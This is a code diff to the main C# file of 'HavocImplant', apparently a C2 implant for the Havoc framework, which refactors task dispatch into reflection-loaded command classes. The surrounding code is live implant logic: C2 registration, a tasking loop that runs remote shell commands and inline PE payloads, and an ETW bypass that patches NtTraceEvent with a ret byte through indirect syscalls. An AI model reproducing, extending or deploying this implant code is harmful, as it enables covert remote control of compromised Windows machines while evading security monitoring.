@@ -4,21 +4,15 @@ using System.Linq;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
-using System.Net.Http;
 using System.Net;
-using System.Collections;
-using System.IO;
 using System.Diagnostics;
 using System.Threading;
-using System.Text.RegularExpressions;
 using Microsoft.Win32;
-using System.Security.Cryptography;
-using System.Management;
-using HavocImplant.AgentFunctions.BofExec;
-using HavocImplant.AgentFunctions.BofExec.Internals;
 using HavocImplant.NativeUtils;
-using static HavocImplant.Implant;
 using HavocImplant.Communications;
+using HavocImplant.AgentFunctions;
+using System.Reflection;
+using System.Windows.Forms;
 
 namespace HavocImplant
 {
@@ -63,13 +57,31 @@ namespace HavocImplant
 
         // Locking resource related stuff
         static readonly object pe_lock = new object();
-        static void Main(string[] args) // Looping through tasks and stuff
+
+        public static List<CommandInterface> Commands = new List<CommandInterface>();
+
+
+        static async Task Main() // Looping through tasks and stuff
         {
             Implant implant = new Implant();
             Random rand = new Random();
 
             Comms.Init(implant);
             Communications.Utils.Init(implant);
+            // Load our commands, thanks Rasta
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach (var type in self.GetTypes())
+            {
+                if (!type.IsSubclassOf(typeof(CommandInterface)))
+                    continue;
+
+                var command = (CommandInterface)Activator.CreateInstance(type);
+                command.Init(implant);
+
+                Commands.Add(command);
+            }
+
             if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
             while (!implant.registered) Comms.Register();
@@ -121,11 +133,11 @@ namespace HavocImplant
                         switch (command.Split(' ')[0])
                         {
                             case "shell":
-                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
-                                shellThread.Start();
+                                await HandleCommand(command, taskId);
                                 break;
                             case "goodbye":
                                 Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
+                                
                             case "sleep":
                                 Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                 sleepThread.Start();
@@ -175,6 +187,7 @@ namespace HavocImplant
                                     inlinePEThread.Start();
                                     break;
                                 }
+                                
                         }
                     }
                 }
@@ -235,6 +248,12 @@ namespace HavocImplant
             Marshal.WriteByte(pNtTraceEvent, 0xc3);
             globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
             
+        }
+
+        public static async Task HandleCommand(string command, int taskId)
+        {
+            var com = Commands.FirstOrDefault(c => c.Command == command.Split(' ')[0]);
+            com.Run(command.Substring(5).Trim(), taskId);
         }
     }
 }
